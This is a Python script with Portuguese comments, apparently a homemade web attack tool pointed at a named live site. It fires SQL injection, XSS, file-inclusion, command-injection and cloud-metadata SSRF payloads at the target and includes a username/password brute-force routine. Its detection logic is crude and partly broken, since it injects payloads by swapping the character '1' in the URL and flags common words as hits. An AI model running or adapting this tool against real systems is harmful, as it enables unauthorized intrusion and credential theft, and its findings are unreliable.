import requests
import itertools
from urllib.parse import urljoin, urlparse

# Configurações de Alvo e Payloads
TARGET_URL = "https://francodes.dev/" # Alvo para testes
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

PAYLOADS = {
    "SQLi": [
        "' OR '1'='1", 
        "\" OR \"1\"=\"1", 
        "' UNION SELECT NULL,NULL--", 
        "admin' --", 
        "1' SLEEP(5)--"
    ],
    "XSS": [
        "<script>alert('XSS')</script>", 
        "<img src=x onerror=alert(1)>", 
        "javascript:alert(1)", 
        "'\"><script>alert(1)</script>"
    ],
    "LFI": [
        "../../../../etc/passwd", 
        "../../../../windows/win.ini", 
        "/etc/passwd%00", 
        "php://filter/convert.base64-encode/resource=index.php"
    ],
    "RCE": [
        "; ls -la", 
        "&& dir", 
        "| id", 
        "$(whoami)", 
        "; sleep 5"
    ],
    "SSRF": [
        "http://127.0.0.1", 
        "http://169.254.169.254/latest/meta-data/", 
        "http://localhost:80", 
        "file:///etc/passwd"
    ]
}

# Listas para Brute Force
USERNAMES = ["admin", "user", "guest", "root"]
PASSWORDS = ["123456", "password", "admin123", "root"]

def check_response(response, payload_type, payload):
    """Analisa a resposta do servidor para identificar vulnerabilidades."""
    content = response.text.lower()
    
    if payload_type == "SQLi":
        indicators = ["sql syntax", "mysql error", "oracle error", "postgresql error", "driver error"]
        if any(ind in content for ind in indicators):
            return True
            
    if payload_type == "XSS":
        if payload in response.text:
            return True
            
    if payload_type == "LFI":
        indicators = ["root:x:0:0", "[extensions]", "bin/bash"]
        if any(ind in content for ind in indicators):
            return True
            
    if payload_type == "RCE":
        indicators = ["uid=", "gid=", "Directory of", "total"]
        if any(ind in content for ind in indicators):
            return True
            
    if payload_type == "SSRF":
        # Verifica se a resposta mudou significativamente ou se retornou metadados conhecidos
        if len(response.content) != len(requests.get(TARGET_URL).content):
            return True

    return False

def run_exploit_tests():
    print(f"[*] Iniciando testes de exploração em: {TARGET_URL}")
    headers = {"User-Agent": USER_AGENT}
    
    # Testes de Injeção (SQLi, XSS, LFI, RCE, SSRF)
    for vuln_type, payloads in PAYLOADS.items():
        print(f"\n[+] Testando {vuln_type}...")
        for payload in payloads:
            try:
                # Substitui o valor do parâmetro na URL pelo payload
                test_url = TARGET_URL.replace("1", payload) 
                res = requests.get(test_url, headers=headers, timeout=5)
                
                if check_response(res, vuln_type, payload):
                    print(f" [!] VULNERABILIDADE ENCONTRADA: {vuln_type} | Payload: {payload}")
            except Exception as e:
                print(f" [?] Erro ao testar {payload}: {e}")

def brute_force_login(login_url):
    print("\n[+] Iniciando Brute Force em: " + login_url)
    headers = {"User-Agent": USER_AGENT}
    
    for user, pwd in itertools.product(USERNAMES, PASSWORDS):
        try:
            data = {"username": user, "password": pwd}
            res = requests.post(login_url, data=data, headers=headers, timeout=5)
            
            # Verifica se o login foi bem sucedido (ex: redirecionamento ou ausência de 'erro')
            if "invalid" not in res.text.lower() and "error" not in res.text.lower():
                print(f" [!] CREDENCIAIS ENCONTRADAS: {user}:{pwd}")
                return
        except Exception as e:
            print(f" [?] Erro no brute force: {e}")

if __name__ == "__main__":
    run_exploit_tests()
    # Exemplo de uso para brute force:
    # brute_force_login("http://exemplo.com/login.php")
